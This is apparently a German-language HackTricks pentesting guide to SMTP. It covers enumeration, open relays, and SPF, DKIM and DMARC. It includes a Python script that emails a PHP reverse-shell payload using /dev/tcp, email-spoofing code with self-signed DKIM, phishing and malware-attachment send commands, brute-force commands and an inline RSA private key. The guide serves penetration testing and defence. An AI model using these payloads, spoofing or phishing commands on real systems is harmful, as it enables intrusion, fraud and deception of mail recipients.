# 25,465,587 - Pentesting SMTP/s

{{#include ../../banners/hacktricks-training.md}}

## **Grundinformationen**

Das **Simple Mail Transfer Protocol (SMTP)** ist ein Protokoll, das innerhalb der TCP/IP-Suite für das **Senden und Empfangen von E-Mails** verwendet wird. Aufgrund seiner Einschränkungen beim Warten von Nachrichten am Empfängerende wird SMTP häufig zusammen mit **POP3 oder IMAP** eingesetzt. Diese zusätzlichen Protokolle ermöglichen es Benutzern, Nachrichten auf einem Server-Postfach zu speichern und sie regelmäßig herunterzuladen.

In der Praxis ist es üblich, dass **E-Mail-Programme** **SMTP zum Senden von E-Mails** verwenden, während sie **POP3 oder IMAP zum Empfangen** nutzen. Auf Unix-basierten Systemen sticht **sendmail** als der am häufigsten verwendete SMTP-Server für E-Mail-Zwecke hervor. Das kommerzielle Paket Sendmail umfasst einen POP3-Server. Darüber hinaus bietet **Microsoft Exchange** einen SMTP-Server und die Möglichkeit, POP3-Unterstützung hinzuzufügen.

**Standardport:** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
### EMAIL-Header

Wenn Sie die Möglichkeit haben, **das Opfer dazu zu bringen, Ihnen eine E-Mail zu senden** (zum Beispiel über das Kontaktformular der Webseite), tun Sie dies, denn **Sie könnten über die interne Topologie** des Opfers lernen, indem Sie die Header der E-Mail ansehen.

Sie können auch eine E-Mail von einem SMTP-Server erhalten, indem Sie versuchen, **eine E-Mail an eine nicht existierende Adresse an diesen Server zu senden** (da der Server dem Angreifer eine NDN-E-Mail senden wird). Stellen Sie jedoch sicher, dass Sie die E-Mail von einer erlaubten Adresse senden (überprüfen Sie die SPF-Richtlinie) und dass Sie NDN-Nachrichten empfangen können.

Sie sollten auch versuchen, **verschiedene Inhalte zu senden, da Sie möglicherweise interessantere Informationen** in den Headern finden, wie: `X-Virus-Scanned: by av.domain.com`\
Sie sollten die EICAR-Testdatei senden.\
Die Erkennung des **AV** kann es Ihnen ermöglichen, **bekannte Schwachstellen auszunutzen.**

## Grundlegende Aktionen

### **Banner Grabbing/Grundlegende Verbindung**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**:
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### Finden von MX-Servern einer Organisation
```bash
dig +short mx google.com
```
### Aufzählung
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM Auth - Informationsoffenlegung

Wenn der Server NTLM-Authentifizierung (Windows) unterstützt, können Sie sensible Informationen (Versionen) erhalten. Weitere Informationen [**hier**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666).
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
Oder **automatisieren** Sie dies mit dem **nmap**-Plugin `smtp-ntlm-info.nse`

### Interner Servername - Informationsoffenlegung

Einige SMTP-Server vervollständigen automatisch die Adresse eines Absenders, wenn der Befehl "MAIL FROM" ohne vollständige Adresse ausgegeben wird, und geben ihren internen Namen preis:
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### Sniffing

Überprüfen Sie, ob Sie einige Passwörter aus den Paketen zu Port 25 sniffen.

### [Auth bruteforce](../../generic-hacking/brute-force.md#smtp)

## Benutzername Bruteforce Enumeration

**Authentifizierung ist nicht immer erforderlich**

### RCPT TO
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```
### EXPN
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```
### Automatische Werkzeuge
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
## DSN-Berichte

**Zustellstatusbenachrichtigungsberichte**: Wenn Sie eine **E-Mail** an eine Organisation an eine **ungültige Adresse** senden, wird die Organisation Sie benachrichtigen, dass die Adresse ungültig war, indem sie eine **E-Mail zurücksendet**. Die **Header** der zurückgesendeten E-Mail werden mögliche **sensible Informationen** enthalten (wie die IP-Adresse der Mail-Services, die mit den Berichten interagiert haben, oder Informationen über Antiviren-Software).

## [Befehle](smtp-commands.md)

### Senden einer E-Mail von der Linux-Konsole
```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
### Eine E-Mail mit Python senden

<details>

<summary>Python-Code hier</summary>
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
</details>

## SMTP Smuggling

Die SMTP Smuggling-Schwachstelle ermöglichte es, alle SMTP-Schutzmaßnahmen zu umgehen (siehe den nächsten Abschnitt für weitere Informationen zu den Schutzmaßnahmen). Für weitere Informationen zu SMTP Smuggling siehe:

{{#ref}}
smtp-smuggling.md
{{#endref}}

## Mail Spoofing Gegenmaßnahmen

Organisationen wird es durch den Einsatz von **SPF**, **DKIM** und **DMARC** untersagt, unbefugte E-Mails in ihrem Namen zu versenden, da das Spoofing von SMTP-Nachrichten einfach ist.

Ein **vollständiger Leitfaden zu diesen Gegenmaßnahmen** ist verfügbar unter [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/).

### SPF

> [!CAUTION]
> SPF [wurde 2014 "abgelehnt"](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/). Das bedeutet, dass Sie anstelle der Erstellung eines **TXT-Datensatzes** in `_spf.domain.com` diesen in `domain.com` mit der **gleichen Syntax** erstellen.\
> Darüber hinaus ist es recht üblich, etwas wie `"v=spf1 include:_spf.google.com ~all"` zu finden, um frühere SPF-Datensätze wiederzuverwenden.

**Sender Policy Framework** (SPF) ist ein Mechanismus, der es Mail Transfer Agents (MTAs) ermöglicht zu überprüfen, ob ein Host, der eine E-Mail sendet, autorisiert ist, indem eine Liste autorisierter Mail-Server abgefragt wird, die von den Organisationen definiert wurde. Diese Liste, die IP-Adressen/-Bereiche, Domains und andere Entitäten **enthält, die berechtigt sind, E-Mails im Namen eines Domainnamens zu senden**, umfasst verschiedene "**Mechanismen**" im SPF-Datensatz.

#### Mechanismen

Von [Wikipedia](https://en.wikipedia.org/wiki/Sender_Policy_Framework):

| Mechanismus | Beschreibung                                                                                                                                                                                                                                                                                                                         |
| ----------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL         | Passt immer; wird für ein Standardergebnis wie `-all` für alle IPs verwendet, die nicht von vorherigen Mechanismen übereinstimmen.                                                                                                                                                                                                  |
| A           | Wenn der Domainname einen Adressdatensatz (A oder AAAA) hat, der auf die Adresse des Absenders aufgelöst werden kann, wird er übereinstimmen.                                                                                                                                                                                      |
| IP4         | Wenn der Absender in einem bestimmten IPv4-Adressbereich ist, passt er.                                                                                                                                                                                                                                                             |
| IP6         | Wenn der Absender in einem bestimmten IPv6-Adressbereich ist, passt er.                                                                                                                                                                                                                                                             |
| MX          | Wenn der Domainname einen MX-Datensatz hat, der auf die Adresse des Absenders aufgelöst wird, wird er übereinstimmen (d.h. die E-Mail kommt von einem der eingehenden Mail-Server der Domain).                                                                                                                                      |
| PTR         | Wenn der Domainname (PTR-Datensatz) für die Adresse des Clients im angegebenen Domainnamen ist und dieser Domainname auf die Adresse des Clients aufgelöst wird (vorwärts bestätigte Reverse-DNS), passt er. Dieser Mechanismus wird nicht empfohlen und sollte, wenn möglich, vermieden werden.                                   |
| EXISTS      | Wenn der angegebene Domainname auf eine beliebige Adresse aufgelöst wird, passt er (unabhängig von der Adresse, auf die er aufgelöst wird). Dies wird selten verwendet. Zusammen mit der SPF-Makrosprache bietet es komplexere Übereinstimmungen wie DNSBL-Abfragen.                                                                 |
| INCLUDE     | Verweist auf die Richtlinie einer anderen Domain. Wenn die Richtlinie dieser Domain besteht, besteht dieser Mechanismus. Wenn die eingeschlossene Richtlinie jedoch fehlschlägt, wird die Verarbeitung fortgesetzt. Um vollständig an die Richtlinie einer anderen Domain zu delegieren, muss die Umleitungs-Erweiterung verwendet werden. |
| REDIRECT    | <p>Eine Umleitung ist ein Verweis auf einen anderen Domainnamen, der eine SPF-Richtlinie hostet. Sie ermöglicht es mehreren Domains, dieselbe SPF-Richtlinie zu teilen. Sie ist nützlich, wenn man mit einer großen Anzahl von Domains arbeitet, die dieselbe E-Mail-Infrastruktur teilen.</p><p>Die SPF-Richtlinie der im Umleitungsmechanismus angegebenen Domain wird verwendet.</p> |

Es ist auch möglich, **Qualifizierer** zu identifizieren, die **angeben, was zu tun ist, wenn ein Mechanismus übereinstimmt**. Standardmäßig wird der **Qualifizierer "+"** verwendet (wenn also ein Mechanismus übereinstimmt, bedeutet das, dass es erlaubt ist).\
Normalerweise werden Sie **am Ende jeder SPF-Richtlinie** etwas wie: **\~all** oder **-all** bemerken. Dies wird verwendet, um anzuzeigen, dass **wenn der Absender mit keiner SPF-Richtlinie übereinstimmt, die E-Mail als untrusted (\~) markiert oder (-) abgelehnt werden sollte.**

#### Qualifizierer

Jeder Mechanismus innerhalb der Richtlinie kann mit einem der vier Qualifizierer vorangestellt werden, um das beabsichtigte Ergebnis zu definieren:

- **`+`**: Entspricht einem PASS-Ergebnis. Standardmäßig nehmen Mechanismen diesen Qualifizierer an, wodurch `+mx` gleichwertig zu `mx` ist.
- **`?`**: Stellt ein NEUTRAL-Ergebnis dar, das ähnlich wie NONE (keine spezifische Richtlinie) behandelt wird.
- **`~`**: Bezeichnet SOFTFAIL und dient als Mittelweg zwischen NEUTRAL und FAIL. E-Mails, die dieses Ergebnis erfüllen, werden typischerweise akzeptiert, aber entsprechend markiert.
- **`-`**: Gibt FAIL an und deutet darauf hin, dass die E-Mail vollständig abgelehnt werden sollte.

Im kommenden Beispiel wird die **SPF-Richtlinie von google.com** veranschaulicht. Beachten Sie die Einbeziehung von SPF-Richtlinien aus verschiedenen Domains innerhalb der ersten SPF-Richtlinie:
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
Traditionell war es möglich, jeden Domainnamen zu fälschen, der keinen korrekten/keinen SPF-Eintrag hatte. **Heutzutage** wird eine **E-Mail**, die von einer **Domain ohne einen gültigen SPF-Eintrag** kommt, wahrscheinlich **automatisch abgelehnt/als nicht vertrauenswürdig markiert**.

Um den SPF einer Domain zu überprüfen, können Sie Online-Tools wie: [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html) verwenden.

### DKIM (DomainKeys Identified Mail)

DKIM wird verwendet, um ausgehende E-Mails zu signieren, sodass sie von externen Mail Transfer Agents (MTAs) durch den Abruf des öffentlichen Schlüssels der Domain aus dem DNS validiert werden können. Dieser öffentliche Schlüssel befindet sich im TXT-Eintrag einer Domain. Um auf diesen Schlüssel zuzugreifen, muss man sowohl den Selektor als auch den Domainnamen kennen.

Um den Schlüssel anzufordern, sind der Domainname und der Selektor erforderlich. Diese können im E-Mail-Header `DKIM-Signature` gefunden werden, z.B. `d=gmail.com;s=20120113`.

Ein Befehl, um diese Informationen abzurufen, könnte so aussehen:
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC (Domain-based Message Authentication, Reporting & Conformance)

DMARC verbessert die E-Mail-Sicherheit, indem es auf den SPF- und DKIM-Protokollen aufbaut. Es legt Richtlinien fest, die Mailserver bei der Verarbeitung von E-Mails aus einer bestimmten Domain leiten, einschließlich des Umgangs mit Authentifizierungsfehlern und wo Berichte über E-Mail-Verarbeitungsaktionen gesendet werden sollen.

**Um den DMARC-Eintrag zu erhalten, müssen Sie die Subdomain \_dmarc abfragen**
```bash
# Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
```
#### DMARC-Tags

| Tag-Name | Zweck                                         | Beispiel                        |
| -------- | --------------------------------------------- | ------------------------------- |
| v        | Protokollversion                              | v=DMARC1                        |
| pct      | Prozentsatz der Nachrichten, die gefiltert werden | pct=20                          |
| ruf      | Reporting-URI für forensische Berichte       | ruf=mailto:authfail@example.com |
| rua      | Reporting-URI von aggregierten Berichten      | rua=mailto:aggrep@example.com   |
| p        | Richtlinie für die organisatorische Domain    | p=quarantine                    |
| sp       | Richtlinie für Subdomains der OD              | sp=reject                       |
| adkim    | Ausrichtungsmodus für DKIM                    | adkim=s                         |
| aspf     | Ausrichtungsmodus für SPF                     | aspf=r                          |

### **Was ist mit Subdomains?**

**Von** [**hier**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**.**\
Sie müssen separate SPF-Einträge für jede Subdomain haben, von der Sie E-Mails senden möchten.\
Das Folgende wurde ursprünglich auf openspf.org veröffentlicht, das früher eine großartige Ressource für solche Dinge war.

> Die Dämonenfrage: Was ist mit Subdomains?
>
> Wenn ich eine E-Mail von pielovers.demon.co.uk erhalte und es keine SPF-Daten für pielovers gibt, sollte ich dann eine Ebene zurückgehen und SPF für demon.co.uk testen? Nein. Jede Subdomain bei Demon ist ein anderer Kunde, und jeder Kunde könnte seine eigene Richtlinie haben. Es wäre nicht sinnvoll, dass die Richtlinie von Demon standardmäßig für alle seine Kunden gilt; wenn Demon das möchte, kann es SPF-Einträge für jede Subdomain einrichten.
>
> Daher lautet der Rat an SPF-Publisher: Sie sollten einen SPF-Eintrag für jede Subdomain oder jeden Hostnamen hinzufügen, der einen A- oder MX-Eintrag hat.
>
> Websites mit Wildcard-A- oder MX-Einträgen sollten auch einen Wildcard-SPF-Eintrag in der Form haben: \* IN TXT "v=spf1 -all"

Das macht Sinn - eine Subdomain kann sich sehr wohl an einem anderen geografischen Standort befinden und eine sehr unterschiedliche SPF-Definition haben.

### **Open Relay**

Wenn E-Mails gesendet werden, ist es entscheidend, sicherzustellen, dass sie nicht als Spam markiert werden. Dies wird oft durch die Verwendung eines **Relay-Servers, der vom Empfänger vertraut wird**, erreicht. Ein häufiges Problem ist jedoch, dass Administratoren möglicherweise nicht vollständig darüber informiert sind, welche **IP-Bereiche sicher sind, um sie zuzulassen**. Dieses mangelnde Verständnis kann zu Fehlern bei der Einrichtung des SMTP-Servers führen, ein Risiko, das häufig in Sicherheitsbewertungen identifiziert wird.

Ein Workaround, den einige Administratoren verwenden, um Probleme bei der E-Mail-Zustellung zu vermeiden, insbesondere in Bezug auf die Kommunikation mit potenziellen oder laufenden Kunden, besteht darin, **Verbindungen von jeder IP-Adresse zuzulassen**. Dies geschieht, indem der Parameter `mynetworks` des SMTP-Servers so konfiguriert wird, dass er alle IP-Adressen akzeptiert, wie unten gezeigt:
```bash
mynetworks = 0.0.0.0/0
```
Um zu überprüfen, ob ein Mailserver ein offenes Relay ist (was bedeutet, dass er E-Mails von jeder externen Quelle weiterleiten könnte), wird das Tool `nmap` häufig verwendet. Es enthält ein spezifisches Skript, das dafür entwickelt wurde, dies zu testen. Der Befehl, um einen ausführlichen Scan auf einem Server (zum Beispiel mit der IP 10.10.10.10) an Port 25 mit `nmap` durchzuführen, lautet:
```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **Tools**

- [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **Überprüfen Sie SPF- und DMARC-Fehlkonfigurationen**
- [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **Automatisch SPF- und DMARC-Konfigurationen abrufen**

### Spoof-E-Mail senden

- [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
- [**http://www.anonymailer.net/**](http://www.anonymailer.net)
- [**https://emkei.cz/**](https://emkei.cz/)

**Oder Sie könnten ein Tool verwenden:**

- [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
> [!WARNING]
> Wenn Sie einen **Fehler bei der Verwendung der dkim Python-Bibliothek** beim Parsen des Schlüssels erhalten, können Sie diesen folgenden verwenden.\
> **HINWEIS**: Dies ist nur ein schneller Fix, um schnelle Überprüfungen in Fällen durchzuführen, in denen aus irgendeinem Grund der openssl private key **nicht von dkim geparst werden kann**.
>
> ```
> -----BEGIN RSA PRIVATE KEY-----
> MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
> spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
> pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
> AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
> koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
> fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
> 1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
> ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
> GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
> 422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
> Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
> zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
> K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
> -----END RSA PRIVATE KEY-----
> ```

**Oder Sie könnten es manuell tun:**

{{#tabs}}
{{#tab name="PHP"}}

<pre class="language-php"><code class="lang-php"><strong># Dies wird eine nicht signierte Nachricht senden
</strong><strong>mail("your_email@gmail.com", "Test Subject!", "hey! Dies ist ein Test", "From: administrator@victim.com");
</strong></code></pre>

{{#endtab}}

{{#tab name="Python"}}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{{#endtab}}
{{#endtabs}}

### **Weitere Informationen**

**Weitere Informationen zu diesen Schutzmaßnahmen finden Sie unter** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/)

### **Weitere Phishing-Indikatoren**

- Alter der Domain
- Links, die auf IP-Adressen verweisen
- Linkmanipulationstechniken
- Verdächtige (ungewöhnliche) Anhänge
- Beschädigter E-Mail-Inhalt
- Verwendete Werte, die von den Mail-Headern abweichen
- Existenz eines gültigen und vertrauenswürdigen SSL-Zertifikats
- Einreichung der Seite bei Webinhaltsfilterseiten

## Exfiltration über SMTP

**Wenn Sie Daten über SMTP senden können** [**lesen Sie dies**](../../generic-hacking/exfiltration.md#smtp)**.**

## Konfigurationsdatei

### Postfix

Normalerweise, wenn installiert, befindet sich in `/etc/postfix/master.cf` **Skripte zur Ausführung**, wenn beispielsweise eine neue E-Mail von einem Benutzer empfangen wird. Zum Beispiel bedeutet die Zeile `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}`, dass `/etc/postfix/filtering` ausgeführt wird, wenn eine neue E-Mail vom Benutzer mark empfangen wird.

Andere Konfigurationsdateien:
```
sendmail.cf
submit.cf
```
## Referenzen

- [https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/](https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/)
- [https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/](https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/)

## HackTricks Automatische Befehle
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
{{#include ../../banners/hacktricks-training.md}}
